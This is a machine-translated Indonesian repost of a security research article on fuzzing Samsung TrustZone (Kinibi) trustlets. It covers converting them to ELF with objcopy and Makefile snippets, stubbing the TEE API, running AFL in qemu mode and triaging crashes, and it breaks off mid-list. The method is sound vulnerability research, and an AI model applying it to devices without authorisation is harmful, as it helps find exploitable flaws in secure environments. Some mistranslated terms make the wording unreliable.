<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>👩‍✈️ 🧓🏾 🌺 Cari kerentanan di Samsung TrustZone, atau AFL fuzz all ↘️ 🙇🏾 ◀️</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Seiring waktu, semakin banyak teknologi protektif muncul, karena itu peretas harus mengencangkan ikat pinggang mereka lebih erat. Namun, koin ini memi...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>Cari kerentanan di Samsung TrustZone, atau AFL fuzz all</h1><div class="post__body post__body_full"><div class="post__text post__text-html" id="post-content-body" data-io-article-url="https://habr.com/ru/company/dsec/blog/478948/"><p><img src="https://habrastorage.org/webt/uk/fw/rl/ukfwrlxwv9vr1rrwahfzdidi9na.jpeg"></p><br><p>  Seiring waktu, semakin banyak teknologi protektif muncul, karena itu peretas harus mengencangkan ikat pinggang mereka lebih erat.  Namun, koin ini memiliki dua sisi: teknologi pertahanan juga menciptakan permukaan serangan tambahan, dan untuk menyiasatinya, Anda hanya perlu menggunakan kerentanan dalam kode mereka. </p><br><p>  Mari kita lihat salah satu teknologi ini - ARM TrustZone.  Implementasinya mengandung sejumlah besar kode, dan untuk mencari kerentanan di dalamnya, Anda memerlukan semacam cara otomatis.  Kami menggunakan metode lama yang terbukti - fuzzing.  Tapi pintar! </p><br><p>  Kami akan menghapus aplikasi khusus yang muncul dengan diperkenalkannya teknologi TrustZone - trustlet.  Untuk menjelaskan secara rinci metode fuzzing yang telah kami pilih, pertama-tama kita beralih ke teori tentang TrustZone, sistem operasi tepercaya, dan interaksi dengan sistem operasi konvensional.  Ini tidak lama.  Ayo pergi! </p><a name="habracut"></a><br><h2 id="arm-trustzone">  ARM TrustZone </h2><br><p>  Teknologi TrustZone dalam prosesor ARM memungkinkan Anda mentransfer pemrosesan informasi rahasia ke lingkungan aman yang terisolasi.  Pemrosesan tersebut dilakukan, misalnya, oleh Keystore, layanan Sidik Jari di OS Android, teknologi perlindungan hak cipta DRM, dll. </p><br><p>  Sudah <a href="https://developer.arm.com/ip-products/security-ip/trustzone">banyak yang</a> <a href="https://habr.com/ru/company/aladdinrd/blog/342924/">ditulis</a> tentang perangkat TrustZone, jadi kami hanya akan mengingat sebentar. </p><br><p><img src="https://habrastorage.org/webt/eu/ny/dg/eunydg_xqmclgf_f47vvwrsdplw.png"></p><br><p>  TrustZone membagi "dunia" (dalam hal TrustZone - Dunia) menjadi dua - Dunia Normal dan Dunia Aman - dan menambahkan empat mode eksekusi ke prosesor: </p><br><ul><li>  EL3 - mode monitor - mode di mana sistem mulai, dan yang merupakan mode eksekusi yang paling disukai; </li><li>  S-EL2 - mode hypervisor tepercaya; </li><li>  S-EL1 - mode sistem operasi tepercaya; </li><li>  S-EL0 - mode aplikasi tepercaya (aplikasi tepercaya, TA, trustlets), atau trustlets. </li></ul><br><p>  Pada SoC dengan teknologi TrustZone, dua sistem operasi dapat bekerja secara bersamaan.  Salah satu yang berfungsi di Dunia Normal disebut Rich OS, dan yang kedua dari Secure World adalah OS TEE (Trusted Execution Environment).  Sudah ada lebih dari selusin sistem operasi tepercaya ini.  Kami akan fokus pada satu spesifik - Trustonic Kinibi.  Ini, khususnya, digunakan pada ponsel Samsung dengan SoC Exynos inklusif hingga Galaxy S9. </p><br><h2 id="trustonic-kinibi">  Kinibi trustonic </h2><br><p>  Trustonic <a href="https://www.nfcworld.com/2012/12/18/321625/arm-gemalto-and-gd-introduce-alternative-to-nfc-secure-elements/">diciptakan oleh ARM, Gemalto, dan Giesecke &amp; Devrient (G&amp;D)</a> dan terus mengembangkan sistem operasi Mobicore Giesecke &amp; Devrient (G&amp;D) dengan nama Kinibi. </p><br><p>  Sistem operasi Kinibi mendukung <a href="https://globalplatform.org/technical-committees/trusted-execution-environment-tee-committee/">standar Lingkungan Eksekusi Tepercaya Platform Global</a> .  Diagram strukturalnya ditunjukkan pada gambar. </p><br><p><img src="https://habrastorage.org/webt/rn/uj/ff/rnujffhmytxef_pzu99cje21fa4.jpeg"></p><br><p>  Seperti yang Anda lihat, implementasi TrustZone mencakup komponen tidak hanya di "dunia yang dilindungi", tetapi juga komponen di "dunia normal".  Untuk memahami yang utama, lebih baik untuk melihat skema sistem ini dari sudut pandang pengembang. </p><br><p><img src="https://habrastorage.org/webt/jf/lr/ok/jflrokza7l-sn8mh84m1a29smjs.jpeg"></p><br><p>  Pada level rendah, di dunia yang dilindungi, selain microkernel, driver dan pekerjaan manajer runtime.  Dan di dunia normal, driver khusus berfungsi, yang memastikan transisi prosesor ke dunia yang dilindungi atas permintaan aplikasi.  Di tingkat userspace, aplikasi dan komponen beroperasi yang menyediakan API untuk menghubungkan aplikasi antara dunia normal dan aman.  Ada juga daemon khusus di dunia normal yang menyediakan peluncuran awal beberapa trustlet, dan melaluinya semua permintaan untuk trustlets dari aplikasi klien harus dilalui. </p><br><p>  Ada dua set API di Kinibi: Global Platform API (ditunjukkan dengan warna hijau) dan Legacy API (merah).  Kedua set menyediakan kira-kira set fungsi yang sama, hanya yang pertama dibangun sesuai dengan standar Platform Global, dan yang kedua, tampaknya, sebelum standar, dan oleh karena itu disebut Legacy.  Terlepas dari kenyataan bahwa, jika dilihat dari namanya, Anda harus menjauh dari penggunaannya, hanya Legacy API yang digunakan dalam trustlets Samsung. </p><br><h2 id="vzaimodeystvie-mezhdu-mirami">  Interaksi antar dunia </h2><br><p>  Untuk memanfaatkan peluang yang disediakan oleh teknologi TrustZone, aplikasi di dunia normal, yang disebut aplikasi klien, berkomunikasi dengan aplikasi tepercaya - trustlet.  Trustlets menerapkan berbagai fungsi: otentikasi, manajemen kunci, bekerja dengan komponen perangkat keras yang mengimplementasikan fungsi keamanan, dll. </p><br><p>  Permintaan ke trustlet dikirimkan menggunakan memori bersama khusus.  Dunia normal dan dunia yang dilindungi, menurut teknologi TrustZone, diisolasi satu sama lain di tingkat atas (EL0 dan S-EL0) dari memori, dan untuk menciptakan wilayah memori bersama di antara mereka, yang disebut Memori Bersama Dunia (WSM), API yang disediakan oleh yang dilindungi dunia. </p><br><p>  Skema umum interaksi antara aplikasi klien dan trustlet terlihat seperti ini: </p><br><p><img src="https://habrastorage.org/webt/6x/91/jb/6x91jbisi920sjwv_vmjch1ltqo.jpeg"></p><br><ol><li>  Aplikasi klien mengakses daemon dengan UID trustlet yang dengannya ia ingin membuat sesi; </li><li>  Daemon menggunakan driver untuk menghubungi sistem operasi tepercaya dengan permintaan untuk mengunduh trustlet; </li><li>  Sistem operasi tepercaya memuat trustlet ke dalam ruang alamat dunia yang dilindungi; </li><li>  Aplikasi klien lagi membuat buffer WSM melalui permintaan ke daemon dan menulis data ke dalamnya untuk permintaan ke trust; </li><li>  Aplikasi klien memberi tahu dunia yang dilindungi tentang kesiapan permintaan; </li><li>  Di dunia yang aman, permintaan dikirim ke trustlet yang diinginkan untuk diproses, dan trustlet menulis hasil kerjanya ke buffer WSM; </li><li>  Permintaan dan siklus respons dapat diulang; </li><li>  Aplikasi klien mengakhiri sesi dengan kepercayaan. </li></ol><br><p>  Kode pseudo dari sesi interaksi untuk aplikasi klien dan untuk trustlet terlihat cukup sederhana.  Untuk aplikasi klien: </p><br><pre><code class="plaintext hljs">void main() { uint8_t* tciBuffer; uint32_t tciLength; uint8_t* mem; uint32_t mem_size; mcOpenDevice(MC_DEVICE_ID_DEFAULT); mcMallocWsm(MC_DEVICE_ID_DEFAULT, 0, tciLength, &amp;tciBuffer, 0); session.deviceId = MC_DEVICE_ID_DEFAULT; mcOpenSession(&amp;session, &amp;uuid, tciBuffer, tciLength); mcMap(&amp;session, mem, mem_size, &amp;mapInfo); mcNotify(&amp;session); mcWaitNotification(&amp;session, -1); mcUnmap(&amp;session, mem1, &amp;mapInfo1); mcCloseSession(&amp;session); mcFreeWsm(MC_DEVICE_ID_DEFAULT, tciBuffer); mcCloseDevice(MC_DEVICE_ID_DEFAULT); }</code> </pre> <br><p>  Untuk trustlet: </p><br><pre> <code class="plaintext hljs">void tlMain(uint8_t *tciData, uint32_t tciLen) { // Check TCI size if (sizeof(tci_t) &gt; tciLen) { // TCI too small -&gt; end Trusted Application tlApiExit(EXIT_ERROR); } // Trusted Application main loop for (;;) { // Wait for a notification to arrive tlApiWaitNotification(INFINITE_TIMEOUT); // Process command // Notify the TLC tlApiNotify(); } }</code> </pre> <br><p>  <code>mcNotify</code> / <code>tlApiNotify</code> dan <code>mcWaitNotification</code> / <code>tlApiWaitNotification</code> - ini adalah fungsi notifikasi yang permintaan / responsnya siap terima di dunia lain, dan fungsi menunggu pemrosesan permintaan.  Juga, aplikasi klien memiliki kemampuan untuk menggunakan fungsi mcMap.  Ini memungkinkan Anda untuk membuat buffer WSM lain, jika diperlukan.  Secara total, menggunakan fungsi ini, Anda hanya dapat membuat empat buffer seperti itu. </p><br><p>  Dengan aplikasi klien, jelas - untuk ponsel Samsung ini adalah aplikasi Android biasa.  Tapi apa itu trustlets? </p><br><h2 id="trastlety-kinibi">  Kinibi Trustlets </h2><br><p>  Trustlets terletak di sistem file biasa perangkat dan file yang berisi kode yang dapat dieksekusi.  Ini bukan format ELF atau APK yang biasa untuk Android.  Trastlets dalam sistem operasi Kinibi memiliki MobiCore Load Format (MCLF) mereka sendiri.  Hal ini dijelaskan dalam komponen tingkat- <a href="">sumber pengguna</a> - <a href="">open source</a> yang telah diposting Trustonic di Github.  Struktur file trustlet dapat digambarkan secara skematis dalam gambar seperti itu (trustlet ada di sebelah kiri). </p><br><p><img src="https://habrastorage.org/webt/6n/wl/3w/6nwl3wam_zcbljj0qalgybotnsw.jpeg"></p><br><p>  Fitur-fitur berikut dapat dibedakan untuk trustlets: </p><br><ul><li>  dieksekusi di ruang alamat yang terisolasi, yaitu, satu trustlet tidak melihat yang lain; </li><li>  tidak memiliki akses ke memori dunia normal, dengan pengecualian buffer WSM, ke memori sistem operasi TEE dan ke memori fisik; </li><li>  terletak di memori di bagian dengan hak berbeda untuk membaca, menulis, dan mengeksekusi; </li><li>  Buffer WSM berada dalam memori yang tidak dapat dieksekusi; </li><li>  Boot tanpa ASLR </li><li>  mereka menggunakan API yang disediakan oleh mclib, perpustakaan yang mengimplementasikan Global Platform API dan Legacy API untuk dunia yang dilindungi; </li><li>  dapat mengakses driver yang dilindungi menggunakan fungsi <code>tlApi_callDriver</code> . </li></ul><br><p>  Seperti yang Anda lihat, trustlets memiliki kemampuan yang sangat terbatas.  Selain itu, mereka menggunakan beberapa mekanisme pertahanan, seperti berbagai atribut memori, dan juga sebagian besar trustlets menggunakan canary stack untuk melindungi terhadap menimpa stack.  Tetapi Kinibi tidak memiliki ASLR, meskipun <a href="https://www.trustonic.com/news/research/providing-random-numbers-without-kernel-rng/">direncanakan</a> dalam versi baru. </p><br><p>  Meskipun semua pembatasan, trustlets adalah target yang sangat menarik bagi penyerang karena alasan berikut: </p><br><ul><li>  Ini adalah jendela di TrustZone dari tingkat userspace di Android; </li><li>  mereka dapat berfungsi sebagai titik awal untuk meningkatkan hak istimewa ke inti sistem operasi TEE; </li><li>  trustlets memiliki akses ke informasi yang dilindungi, di mana bahkan kernel Android tidak memiliki akses. </li></ul><br><p>  Sebagai perangkat uji, kami menggunakan Samsung Galaxy S8.  Jika Anda mencari trastlets di dalamnya, ternyata jumlahnya cukup banyak. </p><br><p><img src="https://habrastorage.org/webt/oi/-2/uw/oi-2uwkk_mdvw7dpyqb1k0_2ubc.png"></p><br><p>  Artinya, ada banyak kode.  Menggunakan analisis statis kode biner untuk mencari kerentanan sepertinya ide yang buruk.  Melibatkan analisis dinamis tidak akan bekerja, jika hanya karena trastlets memiliki format sendiri, berbeda dari apa yang dapat dijalankan pada sistem operasi tradisional.  Akan menyenangkan untuk menggunakan metode fuzzing yang terbukti dengan umpan balik, dan entah bagaimana menangkap crash trustlets ketika mereka terjadi.  Mari kita coba selesaikan masalah yang menarik ini. </p><br><h2 id="kak-zhe-eto-fazzit">  Bagaimana ini fuzz? </h2><br><p>  Bagi mereka yang belum bertemu dengan alat AFL yang luar biasa dan banyak tambahannya, kami sarankan untuk membaca <a href="https://habr.com/ru/company/dsec/blog/435644/">artikel yang bagus ini</a> .  Dan semua orang mungkin tahu bahwa AFL dapat menghapus file ELF.  Selain itu, bahkan file biner dikompilasi pada awalnya tanpa instrumentasi AFL.  Ini dicapai melalui mode qemu.  AFL menggunakan build khusus emulator qemu, di mana fungsionalitas instrumentasi biner dari instruksi cabang ditambahkan ke mode pengguna qemu.  Ini memungkinkan dia untuk fuzz dengan kontrol cakupan kode bahkan untuk file biner.  Dan bonus untuk ini adalah kemampuan untuk menghapus file yang dapat dieksekusi tidak hanya dari arsitektur asli, tetapi dari semua arsitektur yang didukung qemu.  Tetapi untuk menggunakan mode ini dalam tugas kita, kita perlu mengubah trustlets ke format ELF. </p><br><p>  Mari kita lihat lebih dekat file trustlet.  Berkat format terbuka, <a href="https://github.com/ghassani/mclf-ida-loader">ada</a> loader untuk IDA Pro untuk mereka.  Jika Anda membuka trustlet apa pun, kecuali, sebenarnya, kodenya, Anda dapat melihat bahwa itu menggunakan fungsi pustaka mclib.  Sangat menarik bahwa semua panggilan ke fungsi tersebut melewati satu fungsi di alamat yang terekam di header trastlet.  Sebagai contoh, ini adalah bagaimana fungsi tlApiLogvPrintf terlihat dalam kode trustlet, yang, jelas, berkaitan dengan output dari string. </p><br><p><img src="https://habrastorage.org/webt/lh/tx/zb/lhtxzbfra6o6pmp_urykpw8lq9w.png"></p><br><p>  Dapat dilihat bahwa ia meneruskan semua parameter lebih jauh dari fungsi lain.  Ini adalah fungsi penjadwalan mclib, yang alamatnya ditulis di header MCLF di bidang yang disebut <code>tlApiLibEntry</code> .  Artinya, fungsi perpustakaan yang dipanggil dengan cara ini adalah satu-satunya dependensi untuk trustlet, trastlets tidak memiliki tautan lain di luar.  Ini berarti bahwa jika kita menerapkan stubs untuk fungsi API, kita dapat mengeksekusi kode trustlet di lingkungan Linux biasa, tentu saja, terlebih dahulu mengubahnya menjadi file ELF.  Dan itu berarti kita dapat men-debug dan menghapusnya. </p><br><p>  Untuk mengubah trustlet menjadi file ELF, Anda dapat mengambil file yang sudah jadi, misalnya, mengkompilasi aplikasi kosong dengan fungsi utama, dan menambahkan bagian trustlet bersama dengan header-nya.  Mudah!  Juga penting untuk mentransfer kontrol ke kode trustlet.  Tidak ada masalah dengan ini, header trastlet berisi alamat titik masuknya.  Kami mendefinisikan alamat ini di fungsi <code>main</code> kami sebagai alamat fungsi dan menyebutnya.  Setelah berpikir dan bereksperimen, kita dapat menguraikan rencana berikut untuk menyelesaikan masalah kita: </p><br><ol><li>  menerapkan transfer eksekusi ke titik masuknya trustlet; </li><li>  menerapkan fungsi pustaka atau bertopik pada mereka; </li><li>  mengimplementasikan fungsi pengiriman dan menuliskan alamatnya di header tralet; </li><li>  mengatur bagian trustlet ke alamat yang diinginkan. </li></ol><br><p>  Karena kita perlu mengubah banyak trustlet menjadi elf sekaligus, kita perlu memikirkan mengotomatisasi tugas-tugas ini.  Untuk setiap trustlet, parameter berikut harus ditentukan secara otomatis: titik masuk, alamat bagian trustlet dan ukuran buffer input WSM.  Tambahkan ini ke rencana. </p><br><ol><li>  Tetapkan titik masuk, alamat bagian, dan ukuran buffer WSM. </li></ol><br><h2 id="sobiraem-elfa">  Kumpulkan peri itu </h2><br><p>  1) <strong>titik masuk</strong> </p><br><p>  Item pertama dalam paket mudah diimplementasikan dengan kode berikut.  Itu dapat ditambahkan ke fungsi <code>main</code> untuk file ELF sumber kami. </p><br><pre> <code class="plaintext hljs">typedef void (*tlMain_t)(const void* tciBuffer, const uint32_t tciBufferLen); tlMain_t tlMain = sym_tlMain; tlMain(tciBuffer, tciBufferLen);</code> </pre> <br><p>  Kami mengkompilasi kode kami ke file objek. </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -c tlrun.c</code> </pre> <br><p>  <code>sym_tlMain</code> harus ditambahkan ke file objek.  Ini dapat dilakukan dengan menggunakan keberatan. </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-symbol sym_tlMain=$(TLMAIN) tlrun.o tlrun.o.1</code> </pre> <br><p>  Akibatnya, kami mendapatkan <code>tlrun.o.1</code> - sumber yang dikompilasi dengan fungsi <code>main</code> yang mentransfer kontrol ke kode trustlet. </p><br><p>  2) <strong>Fungsi perpustakaan</strong> </p><br><p>  Untuk mengimplementasikan fungsi pustaka, pertama-tama kita perlu daftar semua fungsi ini.  Sekali waktu ada kebocoran dari Qualcomm dengan banyak bahan untuk perangkat seluler berdasarkan prosesor mereka.  Di antara bahan-bahan ini juga beberapa gambar, file header dan gambar debug dari beberapa komponen untuk sistem operasi mobicore.  Dari sana kami mengambil prototipe fungsi perpustakaan dengan angka-angka mereka, diteruskan sebagai parameter ke fungsi pengiriman.  Untuk fungsi dengan tujuan yang diketahui seperti <code>tlApiMalloc</code> atau <code>tlApiLogvPrintf</code> kami membuat implementasi yang sesuai menggunakan fungsi serupa dari libc.  Dan fungsinya tidak begitu jelas, misalnya, kami mengganti <code>tlApiSecSPICmd</code> dengan bertopik sederhana yang menampilkan nama mereka dan mengembalikan status OK.  Seluruh API mengkompilasi ke <code>tllib.o</code> </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -c tllib.c</code> </pre> <br><p>  3) <strong>Fungsi pengiriman</strong> </p><br><p>  Mirip dengan alamat titik masuk, tambahkan simbol, alamatnya sama untuk semua trustlet: </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-symbol sym_tlApiLibEntry=0x108c tlrun.o tlrun.o.1</code> </pre> <br><p>  Implementasi fungsi penjadwalan adalah sepele.  Hanya perlu mempertimbangkan bahwa alamatnya harus ditulis di header.  Karena kita tidak tahu sebelumnya alamat fungsi pengiriman mana yang akan ditemukan setelah menautkan dan memulai, kita harus menulis alamatnya di header trustlet yang sudah di runtime.  Misalnya, ketika memulai file sebelum fungsi <code>main</code> mulai dijalankan. </p><br><pre> <code class="plaintext hljs">void (*sym_tlApiLibEntry)(int num) __attribute__((weak)); void tlApiLibEntry(int num) __attribute__((noplt)); __attribute__((constructor)) void init() { sym_tlApiLibEntry = tlApiLibEntry; }</code> </pre> <br><p>  4) <strong>Bagian</strong> </p><br><p>  Tambahkan bagian ke file objek, kami juga menggunakan <code>objcopy</code> . </p><br><pre> <code class="plaintext hljs">arm-linux-gnueabi-objcopy --add-section .tlbin_text=.text.bin \ --set-section-flags .tlbin_text=code,contents,alloc,load \ --add-section .tlbin_data=.data.bin \ --set-section-flags .tlbin_data=contents,alloc,load \ --add-section .tlbin_bss=.bss.bin \ --set-section-flags .tlbin_bss=contents,alloc,load \ tlrun.o.1 tlrun.o.2</code> </pre> <br><p>  Di sini <code>.tlbin_text</code> adalah nama bagian dari trustlet, dan <code>.text.bin</code> adalah nama file dengan dump bagian ini.  Anda dapat membuang file menggunakan IDA yang sama. </p><br><p>  Sebagai hasil dari konversi ini, trust biner akan ditambahkan ke file ELF sumber. </p><br><p>  5) <strong>Otomasi</strong> </p><br><p>  Untuk seluruh majelis, kami memutuskan untuk menggunakan satu Makefile besar yang umum untuk semua trustlet dan satu kecil, terhubung ke sana untuk setiap trustlet individu dengan parameternya.  Untuk setiap trustlet, Anda perlu menentukan titik masuk, alamat bagian, dan ukuran buffer WSM.  Dua parameter pertama mudah diperoleh dengan skrip sederhana untuk IDA, dan menentukan ukuran buffer terkadang tidak begitu mudah untuk diotomatisasi.  Anda dapat mengotomatiskan tugas ini juga, atau Anda dapat menghabiskan 10 menit untuk menentukannya untuk semua trustlet dengan menganalisis kode mereka secara manual.  Parameter ini dapat ditetapkan sebagai variabel di Makefile kecil Anda. </p><br><pre> <code class="plaintext hljs">TLMAIN := 0x98F5D TLTEXT := 1000 TLDATA := c0000 TLBSS := c10e0 TLTCI_LEN := 4096</code> </pre> <br><p>  Dan dalam Makefile besar, gunakan parameter ini dengan cara ini: </p><br><pre> <code class="plaintext hljs">$(CC) $(INCLUDE) -g -DTCILEN=$(TLTCI_LEN) -c tlrun.c # ... $(CC) -g tlrun.o.2 tllib.o --section-start=.tlbin_text=$(TLTEXT),--section-start=.tlbin_data=$(TLDATA),--section-start=.tlbin_bss=$(TLBSS) -o tlrun</code> </pre> <br><p>  Jadi, kami mengubah trustlet menjadi file ELF dengan lokasi yang benar dari bagian trustlet dalam memori dan alamat yang benar di header.  Secara teori, itu bahkan dapat dieksekusi dengan benar dan fuzzed lebih lanjut.  Baiklah, mari kita periksa! </p><br><h2 id="fazzing">  Fuzzing </h2><br><p>  Karena AFL menggunakan qemu untuk menjalankan kode arsitektur non-asli, untuk permulaan akan lebih baik untuk memeriksa apakah elf kami berjalan di bawah emulator sama sekali.  Dan kemudian masalah mulai segera. </p><br><div class="spoiler">  <b class="spoiler_title">Masalah nomor 1: toolchain</b> <div class="spoiler_text"><p>  Untuk mengkompilasi kode dan membuat file, kami menggunakan toolchain arm-linux-gnueabihf.  "hf" pada akhirnya berarti kompiler menggunakan dukungan perangkat keras Hard Float dalam prosesor ARM.  Ketika saya mencoba menjalankan file kami di bawah emulator qemu, itu langsung macet, mengeluarkan "Segmentasi kesalahan".  Menimbang bahwa dalam kode kami tidak ada pekerjaan dengan angka floating-point di mana pun, alasan kecelakaan ini benar-benar tidak dapat dipahami.  Setelah berpikir sebentar, kami memutuskan untuk mencoba menggunakan toolchain tanpa Hard float arm-linux-gnueabi.  Dan kita beruntung!  File berfungsi, dan output darinya mulai muncul di konsol. </p><br><p><img src="https://habrastorage.org/webt/vu/t1/he/vut1hesxzshpmwvirmmvilzpoaw.png"></p><br><p>  Jadi kamu bisa fuzz.  Kami meluncurkan AFL dan di sini ... </p></div></div><br><div class="spoiler">  <b class="spoiler_title">Masalah nomor 2: instrumentasi</b> <div class="spoiler_text"><p><img src="https://habrastorage.org/webt/s-/c_/zr/s-c_zrsukymj9mugaex_hpzt5e4.png"></p><br><p>  Untuk beberapa alasan, AFL tidak melihat instrumentasi.  Pada awalnya itu benar-benar tidak jelas apa masalahnya.  qemu dibangun dengan benar, opsi -Q (mode qemu) diatur.  Mengutuk, saya harus masuk ke kode sumber untuk patch AFL untuk qemu.  Ternyata di tambalan AFL, saat mengunduh file ELF, qemu mencari bagian kode dan menetapkan batas-batas alamat di mana ia akan menghasilkan instrumentasi.  Masalahnya adalah jika ada beberapa bagian kode, untuk beberapa alasan hanya yang pertama yang akan diinstrumentasi.  Ini adalah bug atau fitur, tetapi kami memiliki dua bagian kode, dan titik masuk - utama - adalah yang kedua.  Jelas, dia tidak melihat instrumentasi saat startup, karena tidak ada di bagian kedua!  Lebih jauh dari sumber, Anda dapat melihat bahwa ketika variabel lingkungan AFL_INST_LIBS dihidupkan, batas-batas instrumentasi menjadi tak terbatas.  Nyalakan dan mulai. </p></div></div><br><p><img src="https://habrastorage.org/webt/6l/8d/qt/6l8dqtepbkflj0lutrcb_af4nl4.png"></p><br><p>  Pekerjaan yang membingungkan! </p><br><p>  Idenya dikonfirmasi!  Kami meluncurkan fuzzing dengan umpan balik pada file format biner kustom.  Seperti yang Anda lihat, dia bahkan menemukan semacam kecelakaan.  Jadi, kami mendapatkan cara yang andal untuk menghilangkan binari seperti itu, menangkap kesalahan dalam kode mereka dan juga menjalankannya di Linux biasa dan dengan mudah melakukan debug dengan alat yang ada.  Kelas! </p><br><p>  Selama beberapa hari, kami melakukan fuzzing semua trustlet.  Akibatnya, kami memiliki banyak input data yang menghasilkan crash, dan tugas menganalisis semua crash ini. </p><br><h2 id="analiziruem-krashi">  Menganalisis Kecelakaan </h2><br><p>  Total selama 23 trusts AFL ditemukan 477 kasus uji menghasilkan crash.  Sejumlah besar yang saya benar-benar tidak ingin memproses secara manual.  Di antara serangkaian kasus uji ini, ada yang hampir identik yang menghasilkan kerusakan di tempat yang sama.  Untuk menghapus redundansi kasus uji, Anda dapat menggunakan alat afl-cmin.  Setelah melewati semua trastlets, 225 kasus tetap harus dianalisis.  Ngomong-ngomong, banyak!  Untuk memudahkan tugas kami, kami memutuskan untuk menggunakan alat analisis dinamis yang akan membantu mengidentifikasi kesalahan perangkat lunak dengan lebih akurat dan semua propertinya.  Ini akan membantu mengevaluasi kegunaan bug dan kompleksitas operasinya. </p><br><p>  Jadi, untuk menggunakan beberapa jenis alat analisis dinamis, kita perlu setidaknya menjalankan trustlet yang dikonversi pada sistem ARM asli, dan tidak di bawah virtualisasi qemu.  Linux atau Android mungkin cocok untuk ini. </p><br><div class="spoiler">  <b class="spoiler_title">Masalah 3: bagian</b> <div class="spoiler_text"><p>  Kami memutuskan untuk mengambil sistem 32-bit dengan Linux, karena  Trustlet 32-bit, dan Linux lebih nyaman dan memiliki alat analisis yang lebih dinamis daripada Android.  Dan di sini ternyata ketika diluncurkan, elf kami segera mengeluarkan kesalahan Segmentasi. </p><br><p>  Ternyata masalahnya adalah keanehan binari kita.  Saat membuat mereka, Anda harus menempatkan bagian trustlet di alamat yang diinginkan, di mana alamat bagian kode trustlet selalu 0x1000.  Ini adalah bagian pertama dalam file, dan di depannya masih header ELF pada 0x0.  Dan di Linux, dua halaman pertama ruang alamat, hingga alamat 0x2000, dicadangkan untuk tugas utilitas, jadi ketika loader mencoba memproyeksikan bagian di sana, kesalahan terjadi. </p><br><p>  Ternyata, ada jalan keluar dari situasi ini.  Pada kernel 64-bit, reservasi seperti itu dari halaman pertama dalam memori tidak terjadi, dan pengaturan bagian ini menjadi mungkin.  Karena file kami 32-bit, lebih mudah untuk membuat lingkungan 32-bit pada sistem 64-bit.  Paket <code>debootstrap</code> sangat bagus untuk tujuan ini. </p></div></div><br><div class="spoiler">  <b class="spoiler_title">Masalah nomor 4: tidak ada alat</b> <div class="spoiler_text"><p>  Sekarang karena trustlet kami yang didesain ulang bekerja pada sistem ARM asli, kita perlu mencoba alat analisis dinamis.  Di antara metode analisis dinamis dari file biner adalah debugging dan dynamic binary instrumentation (DBI).  Gdb bagus untuk yang pertama.  Dan untuk yang kedua, tidak ada banyak pilihan: di bawah ARM, pada dasarnya hanya ada tiga kerangka kerja DBI yang stabil - DynamoRIO, Valgrind, dan Frida.  Yang pertama memiliki banyak alat yang bagus untuk melacak dan menangkap kesalahan, tetapi pemuat file ELF, yang diimplementasikan di dalamnya, tidak dapat mengatasi pemuatan file kami.  Valgrind adalah kerangka kerja yang cukup kuat, dan memiliki alat callgrind yang cocok bagi kita untuk melacak dan memcheck untuk memantau operasi memori.  Ternyata mereka menghasilkan hasil yang sangat tidak nyaman untuk parsing, jadi mereka tidak cocok untuk digunakan dalam mode otomatis pada banyak file.  Dan kami tidak punya waktu untuk mencoba Frida.  Jika ada yang punya pengalaman menggunakan Linux di ARM, tuliskan kesan Anda di komentar. </p></div></div><br><p>  Seperti yang Anda lihat, kami hanya bisa puas dengan debugger.  Tetapi menggunakan skrip untuk gdb bahkan ini sudah sangat menyederhanakan pekerjaan kami. </p><br><div class="spoiler">  <b class="spoiler_title">Masalah # 5: fungsi perpustakaan</b> <div class="spoiler_text"><p>  Masalah lain yang jelas dari awal adalah fungsi perpustakaan yang digunakan trastlet.  Kami menggantinya dengan bertopik, dengan pengecualian fungsi yang dapat diganti dengan yang serupa dari libc.  Jelas, jika dalam logika trastlet beberapa kode memproses hasil dari salah satu fungsi tulisan rintisan ini, sangat mungkin bahwa itu akan macet karena mengharapkan data yang sama sekali berbeda, dan ini tidak selalu berarti kesalahan dalam kode. </p><br><p>  Ada beberapa fungsi yang tidak mudah untuk mensimulasikan perilaku fungsi sebenarnya: </p><br><ul><li>  tlApiSecSPICmd; </li><li>  tlApi_callDriver; </li><li>  tlApiWrapObjectExt; </li><li>  tlApiUnWrapObjectExt; </li><li>  tlApiCipherDoFinal; </li><li>  tlApiSignatureSign; </li><li>  ... </li></ul><br><p>  Agar tidak membuang waktu mempelajari kasus meragukan seperti itu, kami memutuskan untuk tidak mempertimbangkan kasus uji yang menggunakan fungsi ini. </p></div></div><br><h2 id="rezultaty-fazzinga">  Hasil yang membingungkan </h2><br><p>  Dalam mode otomatis, menggunakan skrip, kami mengumpulkan informasi berikut di semua trustlet: </p><br><ul><li>  UID Traidlet </li><li>  pengidentifikasi kecelakaan; 